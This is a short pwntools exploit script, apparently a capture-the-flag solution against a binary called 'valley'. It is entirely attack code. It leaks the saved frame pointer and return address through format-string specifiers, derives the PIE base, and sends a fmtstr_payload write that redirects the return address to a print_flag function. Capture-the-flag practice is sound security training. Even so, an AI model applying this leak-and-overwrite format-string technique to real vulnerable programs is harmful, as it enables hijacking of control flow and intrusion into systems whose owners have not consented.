#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./valley")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
target = binary.symbols["print_flag"]

io.sendline(b"%20$ld")
io.recvuntil(b"distance: ")
saved_rbp = int(io.recvline().decode())

io.sendline(b"%21$ld")
io.recvuntil(b"distance: ")
saved_rip = int(io.recvline().decode())

saved_rip_addr = saved_rbp - 0x8
pie_base = saved_rip - 0x1413

payload = fmtstr_payload(6, {saved_rip_addr: pie_base + target}, write_size="short")

print(payload)

io.sendline(payload)
io.interactive()
